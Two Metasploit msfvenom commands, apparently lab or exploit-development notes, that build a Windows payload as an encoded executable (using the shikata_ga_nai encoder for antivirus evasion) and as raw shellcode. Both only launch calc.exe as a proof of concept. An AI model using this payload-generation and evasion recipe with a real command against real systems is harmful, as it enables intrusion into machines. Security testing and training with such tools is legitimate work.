
msfvenom -p windows/exec -a x86 --platform windows -f exe -o payload.exe --encoder x86/shikata_ga_nai CMD=calc.exe

msfvenom -p windows/exec -a x86 --platform windows -f raw -o shell.bin CMD=calc.exe 
